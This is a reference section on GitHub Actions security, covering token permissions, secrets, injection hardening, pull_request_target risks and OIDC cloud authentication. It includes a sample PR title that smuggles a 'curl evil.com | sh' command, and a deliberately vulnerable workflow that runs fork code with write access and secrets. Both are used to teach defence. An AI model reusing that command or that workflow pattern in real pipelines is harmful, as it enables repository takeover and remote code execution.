# Section 7: Permissions, Security, Secrets & OIDC

This section covers the security model surrounding GitHub Actions: the auto-generated `GITHUB_TOKEN`, the `permissions:` field that scopes it, secrets and variables management at three scoping levels, security hardening against supply-chain and injection attacks, and OpenID Connect (OIDC) for keyless cloud authentication.

---

## 7.1 GITHUB_TOKEN

GitHub Actions automatically creates a short-lived installation access token for every workflow run, exposed to jobs as `GITHUB_TOKEN`.

### Lifetime, scope, and references

- **Auto-generated** at the start of each workflow run; **expires when the run completes** (or after 24 hours, whichever comes first).
- **Scope is restricted to the repository** that owns the workflow. It cannot push to, read from, or call APIs on other repositories. For cross-repo automation use a Personal Access Token (PAT) or a GitHub App installation token instead.
- **Two equivalent references** in workflow YAML:
  - `${{ secrets.GITHUB_TOKEN }}` (treated as a secret, automatically masked)
  - `${{ github.token }}` (context value, identical token)
- **Cannot trigger downstream workflow runs**: pushes, PR creations, or other repo events made with `GITHUB_TOKEN` will NOT trigger another workflow run. This prevents accidental recursion. To trigger downstream workflows you must authenticate with a PAT or a GitHub App token.

### Default permissions: permissive vs restricted

The default permission set granted to `GITHUB_TOKEN` when no `permissions:` block is declared is configurable at the **organization** and **enterprise** level (Settings -> Actions -> General -> "Workflow permissions").

| Mode | Default scopes |
|---|---|
| **Permissive** (legacy default) | read/write across most scopes (contents, issues, pull-requests, packages, statuses, checks, deployments, etc.) |
| **Restricted** (recommended, GitHub's current default for new orgs) | `contents: read` + `metadata: read` (+ `packages: read` on public repos). All other scopes default to `none`. |

Org/Enterprise admins can **force "restricted" defaults across all repos**, which is the GitHub-recommended security baseline. Individual repositories cannot loosen below the org default.

### Full list of permission scopes

These are the keys that appear under `permissions:` in workflow YAML (cross-reference Section 1.5 of the workflow YAML spec):

| Scope | What it controls |
|---|---|
| `actions` | Cancel/re-run workflow runs, manage Actions cache, list workflows |
| `attestations` | Generate artifact attestations for builds |
| `checks` | Create and update check runs / check suites |
| `contents` | Read/write repo contents, branches, tags, releases, commits |
| `deployments` | Create deployments and deployment statuses |
| `discussions` | Read/write GitHub Discussions |
| `id-token` | Fetch an OIDC JWT (required for keyless cloud auth) |
| `issues` | Read/write issues and issue comments |
| `models` | Use the GitHub Models inference API |
| `packages` | Read/publish packages to GHCR / GitHub Packages |
| `pages` | Trigger GitHub Pages builds |
| `pull-requests` | Read/write PRs, labels, review comments |
| `repository-projects` | Read/write classic repository projects |
| `security-events` | Read/write code-scanning alerts and SARIF uploads |
| `statuses` | Read/write commit statuses |

Each scope accepts `read`, `write`, or `none`. `write` implies `read`.

### Shortcuts

- `permissions: read-all` — grants `read` on every scope
- `permissions: write-all` — grants `write` on every scope (effectively the legacy permissive default)
- `permissions: {}` — explicitly grants **no** permissions. (On a public repo the workflow can still read public data via unauthenticated APIs, but the token itself is empty.)

---

## 7.2 The `permissions` field

### Workflow-level vs job-level

- Declared at workflow root: applies to all jobs unless overridden.
- Declared inside a job: **completely replaces** the workflow-level value for that job. There is **no merging** — if the workflow grants `contents: read, issues: write` and the job declares `permissions: { id-token: write }`, the job gets ONLY `id-token: write` and loses `contents` and `issues`.

The recommended pattern is workflow-level least-privilege defaults plus per-job elevation:

```yaml
permissions:
  contents: read     # default for every job

jobs:
  build:
    runs-on: ubuntu-latest
    steps: [...]

  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write   # only this job can mint OIDC tokens
      packages: write
    steps: [...]
```

### `{}` vs omitting `permissions`

- **Omitting** `permissions:` -> token receives whatever the org/enterprise default is (permissive or restricted).
- `permissions: {}` -> explicit zero permissions, regardless of org default.

For workflows that don't need any token power (e.g. pure linting jobs that don't post status checks), `permissions: {}` is the most defensive setting.

---

## 7.3 Secrets

Secrets are encrypted values stored by GitHub and decrypted only on the runner at job execution time.

### Three scoping levels

1. **Organization secrets** — set by org owners. Can be restricted to all repos, private repos only, or a specified allow-list of repos.
2. **Repository secrets** — set by users with write access (collaborator on personal repos).
3. **Environment secrets** — scoped to a deployment environment (e.g. `production`, `staging`). Can be combined with required reviewers, wait timers, and deployment branch policies.

### Precedence (highest wins)

When the same name is defined at multiple levels:

```
environment > repository > organization
```

So an `API_KEY` defined on the `production` environment overrides a repo-level `API_KEY`, which in turn overrides an org-level `API_KEY`.

### Storage & encryption

- Encrypted with **libsodium sealed boxes** (public-key authenticated encryption). The repository's public key is fetched via the REST API; the client encrypts the value, and only GitHub holds the decryption private key.
- Decrypted on the runner just-in-time when the job starts; values are never written to disk on the runner unencrypted by GitHub itself (though `run:` steps can of course leak them).

### Limits

- **64 KB per secret** (hard limit). Larger payloads should be GPG-encrypted, committed to the repo, and decrypted with a smaller secret.
- No documented maximum number of secrets per scope, but ~1000 per scope is the practical limit before UI/API performance degrades.

### Naming rules

- May contain only **alphanumeric characters (`A-Z`, `0-9`) and underscores (`_`)**.
- **Must not start with a number.**
- **Must not start with the `GITHUB_` prefix** — that prefix is reserved.
- Names are **case-insensitive** and stored uppercase by GitHub. `my_token` and `MY_TOKEN` collide.

### Automatic log masking

Any value registered as a secret is replaced with `***` in workflow logs via **substring matching** on the literal value. Caveats:

- **Multi-line secrets** are masked line-by-line; partial leakage of a single line can still leak the whole secret if logs are concatenated cleverly.
- **Structured secrets** (JSON, YAML, base64-encoded payloads) are masked **only as the entire registered value**. If your code parses the secret and prints `secret.password`, the inner field is **NOT** automatically masked — you must register each component:
  ```yaml
  - run: |
      PASSWORD=$(jq -r .password <<<"$SECRET_JSON")
      echo "::add-mask::$PASSWORD"
  ```
- **Recommendation**: store atomic values, not structured blobs. One secret per sensitive value.
- **Transformations** (base64, URL-encode, hex) produce strings that the masker doesn't know about. Re-register the transformed value with `::add-mask::` before using it.

### Fork PR behavior — critical security boundary

| Trigger | Token | Secrets exposed? | Code that runs |
|---|---|---|---|
| `pull_request` from a **fork** | **read-only** GITHUB_TOKEN | **No** (except `GITHUB_TOKEN` itself, read-only) | The PR's HEAD code (untrusted) |
| `pull_request` from same repo | normal scoped GITHUB_TOKEN | **Yes** | The PR's HEAD code |
| `pull_request_target` | **full** scoped GITHUB_TOKEN | **Yes** | The **base ref** by default (trusted) — but see Section 7.6 |

**Dependabot is also walled off**: workflows triggered by Dependabot events do NOT have access to regular Actions secrets. Dependabot has its own separate secret store (Settings -> Secrets and variables -> Dependabot) and uses a read-only token by default.

### REST API endpoints (cross-reference Section 3)

```
GET   /repos/{o}/{r}/actions/secrets/public-key      # fetch encryption key
GET   /repos/{o}/{r}/actions/secrets                 # list
GET   /repos/{o}/{r}/actions/secrets/{name}
PUT   /repos/{o}/{r}/actions/secrets/{name}          # encrypt with public key, send
DELETE /repos/{o}/{r}/actions/secrets/{name}

# Environment-scoped
GET/PUT/DELETE /repos/{o}/{r}/environments/{env}/secrets/...

# Org-scoped
GET/PUT/DELETE /orgs/{org}/actions/secrets/...

# Dependabot (separate)
GET/PUT/DELETE /repos/{o}/{r}/dependabot/secrets/...
```

### Reusable workflow caveat

Secrets do **not** auto-propagate into a called reusable workflow. You must pass them explicitly via `secrets:` or use `secrets: inherit` (cross-reference Section 6).

---

## 7.4 Variables (`vars` context)

Plain-text counterpart to secrets — for non-sensitive configuration (region names, feature flags, public URLs).

- **Same three scoping levels**: organization, repository, environment.
- **Same precedence**: environment > repository > organization.
- Visible in plaintext in the UI and via API; **never use for sensitive data**.
- Accessed via `${{ vars.NAME }}` (not `secrets.NAME`).

### Limits

| Scope | Max count | Per-value size |
|---|---|---|
| Organization | 1,000 | 48 KB |
| Repository | 500 | 48 KB |
| Environment | 100 per env | 48 KB |

(Total values per repo are limited by the combined org+repo+env count.)

---

## 7.5 Security hardening

### Pinning third-party actions to a full SHA

Tags and even named branches are mutable; an attacker who compromises a popular action's repo can rewrite a tag to point at malicious code. **Pin to the full 40-character commit SHA**:

```yaml
# Bad — tag is mutable
- uses: actions/checkout@v4

# Better — major-version tag still mutable
- uses: actions/checkout@v4.1.1

# Best — immutable
- uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332  # v4.1.7
```

GitHub's "Verified creator" badge plus a pinned SHA is the strongest available guarantee. **Dependabot understands SHA-pinned actions** and can open PRs to bump them to newer SHAs while preserving the comment.

### Allowed-actions policy at org/enterprise level

Settings -> Actions -> General -> "Allow actions and reusable workflows" offers four modes:

1. **Disable Actions** entirely.
2. **Allow only actions and reusable workflows in this repository**.
3. **Allow GitHub-verified actions** (the `actions/*` and `github/*` namespaces plus marketplace-verified creators).
4. **Allow specified actions and reusable workflows** — explicit allow-list with glob support, e.g. `aws-actions/*, hashicorp/setup-terraform@v3`.

For the highest assurance, vendor third-party actions into a private mirror repo and point the allow-list there.

### Script injection via `github.event.*`

User-controlled fields — issue titles, PR bodies, branch names, commit messages, review comments — are interpolated **literally** into shell scripts when used with `${{ }}` inside `run:`. A PR titled `"; curl evil.com | sh; #` becomes a shell command.

**Vulnerable pattern:**
```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

**Fix — intermediate environment variable:**
```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

When the value is bound to an env var, the shell never re-parses it as code; the bytes stay confined to the variable's value.

**Fields that carry user input** include: `github.event.issue.title`, `github.event.issue.body`, `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.pull_request.head.ref`, `github.event.pull_request.head.label`, `github.event.comment.body`, `github.event.review.body`, `github.event.review_comment.body`, `github.event.pages[*].page_name`, `github.event.commits[*].message`, `github.event.head_commit.message`, `github.head_ref`, `github.event.workflow_run.head_branch`, `github.event.workflow_run.head_commit.message`, `github.event.workflow_run.head_commit.author.email`, `github.event.workflow_run.head_commit.author.name`, `github.event.workflow_run.pull_requests[*].head.ref`.

### Workflow approval for first-time contributors

Settings -> Actions -> General -> "Fork pull request workflows from outside collaborators":

- **Require approval for first-time contributors** (default, recommended).
- **Require approval for first-time contributors who are new to GitHub**.
- **Require approval for all outside collaborators**.

Until approved, workflows on the fork PR are queued and don't burn runner minutes or expose any token. Approving runs the workflow once; subsequent PRs from the same contributor run automatically (under the first option).

### Self-hosted runners on public repos

**Strongly discouraged.** Any user can open a PR with arbitrary code; if that code lands on a self-hosted runner it executes with the runner's environment access (filesystem, network, persistent state from previous jobs). GitHub-hosted runners are ephemeral VMs that destroy themselves after each job, removing this risk.

If self-hosted is unavoidable: organize runners into **runner groups** with explicit repo allow-lists, use **just-in-time (JIT) runners** that self-destruct after one job, and never grant runners more network/IAM access than the workflow strictly needs.

### CODEOWNERS for `.github/workflows/`

Add to `.github/CODEOWNERS`:
```
.github/workflows/ @your-org/security-team
```

Combined with branch-protection "Require review from Code Owners", this prevents any PR that modifies workflow files from merging without security-team sign-off — closing the path where a contributor sneaks a malicious step into a workflow.

---

## 7.6 `pull_request` vs `pull_request_target` — the most dangerous footgun in Actions

| | `pull_request` | `pull_request_target` |
|---|---|---|
| Workflow file source | PR's HEAD ref (the fork's code) | **Base repo's** default branch |
| `GITHUB_TOKEN` permissions | **read-only** for fork PRs | **full** (workflow-declared) |
| Secrets exposed | **No** for fork PRs | **Yes** |
| Default checkout ref | PR HEAD | **base ref** |
| Safe to run untrusted code? | Yes (sandboxed, no secrets) | **No** |

`pull_request_target` exists for legitimate use cases like labeling PRs, posting welcome comments, or running approved-only deployment previews — tasks that need write access to the base repo but don't need to execute fork code.

### The full RCE pattern to NEVER write

```yaml
# DANGEROUS — DO NOT DO THIS
on: pull_request_target
permissions:
  contents: write
  pull-requests: write

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # <-- checks out fork code
      - run: npm install && npm test                       # <-- executes fork code
                                                            # with full token + secrets
```

A drive-by PR can replace `npm test` with anything (or add a malicious `postinstall` script in `package.json`). The fork's code now runs with **write access to the base repo, all secrets, and any cloud credentials** the workflow ordinarily uses. This is a complete repository compromise from a single drive-by PR.

**Safer patterns:**
- Use `pull_request` (not `_target`) for any workflow that checks out and runs PR code.
- For workflows that legitimately need base-repo write access, **do not check out the PR head** — only use base-ref code, or guard with `if: github.event.pull_request.head.repo.full_name == github.repository` to exclude forks.
- Use environment-protected jobs with required reviewers as a second layer.

---

## 7.7 OpenID Connect (OIDC)

OIDC lets GitHub Actions authenticate to cloud providers (AWS, Azure, GCP, HashiCorp Vault, others) **without storing long-lived credentials** as secrets. Each workflow run mints a short-lived JWT, the cloud verifies the JWT against a trust policy, and the cloud returns short-lived cloud credentials.

### Token issuer

```
https://token.actions.githubusercontent.com
```

This URL hosts the OIDC discovery document at `/.well-known/openid-configuration` and the JWKS used by cloud providers to verify signatures.

### Obtaining the token

The runner exposes an internal IDToken endpoint via two env vars (`ACTIONS_ID_TOKEN_REQUEST_URL`, `ACTIONS_ID_TOKEN_REQUEST_TOKEN`). The job must declare `id-token: write`:

```yaml
permissions:
  id-token: write
  contents: read
```

Without `id-token: write`, the env vars are not injected and `getIDToken()` from `@actions/core` returns 403.

### Standard JWT claims

Per RFC 7519:

| Claim | Meaning |
|---|---|
| `iss` | Issuer — `https://token.actions.githubusercontent.com` |
| `sub` | Subject — see formats below |
| `aud` | Audience — caller-specified (e.g. `sts.amazonaws.com`) |
| `iat` | Issued-at timestamp |
| `exp` | Expiry (typically 5–15 minutes after `iat`) |
| `nbf` | Not-before timestamp |
| `jti` | JWT ID (unique per token) |

### Custom claims (GitHub-specific)

| Claim | Value |
|---|---|
| `actor` | The user who triggered the run |
| `actor_id` | Numeric user ID |
| `environment` | Deployment environment name (only when the job uses `environment:`) |
| `event_name` | The event that triggered the run (`push`, `pull_request`, etc.) |
| `head_ref` | Source branch on PR events |
| `base_ref` | Target branch on PR events |
| `job_workflow_ref` | Reusable workflow ref (`owner/repo/.github/workflows/file.yml@ref`) — **critical for reusable workflows** |
| `job_workflow_sha` | SHA of the reusable workflow file |
| `ref` | Branch or tag ref that triggered the run |
| `ref_type` | `branch` or `tag` |
| `repository` | `owner/repo` |
| `repository_id` | Numeric repo ID (immutable across renames) |
| `repository_owner` | Owner login |
| `repository_owner_id` | Numeric owner ID |
| `repository_visibility` | `public`, `private`, or `internal` |
| `run_attempt` | 1-indexed re-run counter |
| `run_id` | Workflow run numeric ID |
| `run_number` | Per-workflow run number |
| `runner_environment` | `github-hosted` or `self-hosted` |
| `sha` | Commit SHA |
| `workflow` | Workflow name |
| `workflow_ref` | Top-level workflow ref |
| `workflow_sha` | Top-level workflow SHA |

Plus `repo_property_*` claims for every custom repository property.

### Default `sub` claim formats

The `sub` claim encodes the security context for trust-policy matching:

| Trigger | Default `sub` |
|---|---|
| Job using `environment: prod` | `repo:OWNER/REPO:environment:prod` |
| Push/PR on a branch | `repo:OWNER/REPO:ref:refs/heads/BRANCH` |
| Tag push | `repo:OWNER/REPO:ref:refs/tags/TAG` |
| Pull request | `repo:OWNER/REPO:pull_request` |

### Customizing the `sub` claim template

For finer-grained trust matching (e.g. binding to a specific reusable workflow ref, or to a job-level identity), customize the template via REST API:

```
PUT /repos/{owner}/{repo}/actions/oidc/customization/sub
PUT /orgs/{org}/actions/oidc/customization/sub
```

Body example:
```json
{
  "use_default": false,
  "include_claim_keys": ["repository", "ref", "job_workflow_ref"]
}
```

The resulting `sub` becomes a colon-joined concatenation of the listed claims.

### Trust policy matching

The cloud provider validates incoming JWTs by:
1. Verifying signature against JWKS at the issuer URL.
2. Checking `iss` matches the configured issuer.
3. Checking `aud` matches the configured audience.
4. Matching `sub` (and optionally other claims) against an allow-list/regex in the role's trust policy.

Only if every check passes does the provider issue cloud credentials.

### AWS configuration

**Step 1 — Create the IAM OIDC identity provider (one-time per account):**

- Provider URL: `https://token.actions.githubusercontent.com`
- Audience: `sts.amazonaws.com`
- Thumbprints: AWS auto-fetches; historically `6938fd4d98bab03faadb97b34396831e3780aea1` and `1c58a3a8518e8759bf075b76b750d4f2df264fcd` (now also auto-rotated).

**Step 2 — Attach a trust policy to an IAM role:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

Use `StringLike` with wildcards (`repo:my-org/my-repo:*`) for permissive matching, or pin to exact `sub` values for tighter control. **Never** use `repo:*:*` — that allows any GitHub repo on the planet to assume your role.

**Step 3 — Workflow:**

```yaml
name: Deploy
on:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
          aws-region: us-east-1
      - run: aws s3 sync ./dist s3://my-bucket/
```

### Azure

Configure a **federated identity credential** on either an App Registration or a User-Assigned Managed Identity in Entra ID. The federated credential subject must match the GitHub `sub` (e.g. `repo:my-org/my-repo:environment:prod`). Use `azure/login@v2` with `client-id`, `tenant-id`, and `subscription-id`.

### GCP

Create a **Workload Identity Pool** plus a **provider** with issuer `https://token.actions.githubusercontent.com`. Map `assertion.sub` to a `principal://` or `principalSet://` and grant that principal `roles/iam.workloadIdentityUser` on a service account. Use `google-github-actions/auth@v2` with `workload_identity_provider` and `service_account`.

### HashiCorp Vault

Configure the JWT auth backend with the GitHub issuer and a role that constrains `bound_claims.sub` and `bound_audiences`. Use `hashicorp/vault-action`.

### Reusable-workflow OIDC: the `job_workflow_ref` claim

When a job runs inside a **called reusable workflow**, the `sub` claim defaults to information about the **caller**, not the called workflow. To bind cloud trust to a specific reusable workflow (so any repo that calls `my-org/shared/.github/workflows/deploy.yml@v1.2.3` can deploy), add `job_workflow_ref` to a customized `sub` template, or write a trust policy that conditions on the `job_workflow_ref` claim directly:

```json
"StringLike": {
  "token.actions.githubusercontent.com:job_workflow_ref":
    "my-org/shared/.github/workflows/deploy.yml@refs/tags/v1.2.3"
}
```

This pattern is the linchpin of org-wide centralized deploy workflows: only the audited reusable workflow can assume the production role, regardless of which repo calls it.

---

## 7.8 Artifact attestations & SLSA

Artifact attestations are signed statements that bind a built artifact (binary, container image, etc.) to the workflow run that produced it, providing tamper-evident **build provenance**.

### Permission

```yaml
permissions:
  id-token: write     # OIDC needed to sign
  contents: read
  attestations: write # write the attestation
  packages: write     # only if attesting a container in GHCR
```

### Build provenance

```yaml
- uses: actions/attest-build-provenance@v1
  with:
    subject-path: 'dist/my-binary'
    # or for container images:
    # subject-name: ghcr.io/my-org/my-image
    # subject-digest: sha256:abc123...
```

The action signs an in-toto SLSA Provenance v1 statement using **Sigstore** (keyless signing, ephemeral keys, transparency log entries in Rekor). The signing key never touches the runner — Sigstore mints a short-lived cert from the OIDC token.

### SBOM attestations

A separate action (`actions/attest-sbom@v1`) signs an SPDX or CycloneDX SBOM file and attaches it to the artifact subject. Use both for full supply-chain coverage.

### SLSA Level 3

To reach SLSA Build Level 3, the build must run on a hardened, isolated builder where the build definition is verifiable and tamper-evident. GitHub achieves this by using **reusable workflows** as the builder — the `job_workflow_ref` claim in the OIDC token cryptographically pins the exact workflow file and ref that produced the artifact, so verifiers can confirm the build wasn't run by a one-off forked workflow.

### Verification

Consumers verify with the GitHub CLI:

```sh
gh attestation verify ./my-binary --owner my-org

# Container image
gh attestation verify oci://ghcr.io/my-org/my-image:v1.0.0 --owner my-org

# SBOM
gh attestation verify ./my-binary --owner my-org \
  --predicate-type https://spdx.dev/Document/v2.3
```

The CLI fetches the attestation, validates the Sigstore certificate chain, checks the Rekor inclusion proof, and confirms the `repository`/`workflow_ref` matches expectations.

---

## Sources

- https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/about-security-hardening-with-openid-connect
- https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services
- https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-azure
- https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-google-cloud-platform
- https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers
- https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault
- https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#permissions
- https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds
- https://docs.github.com/en/rest/actions/secrets
- https://docs.github.com/en/rest/actions/oidc
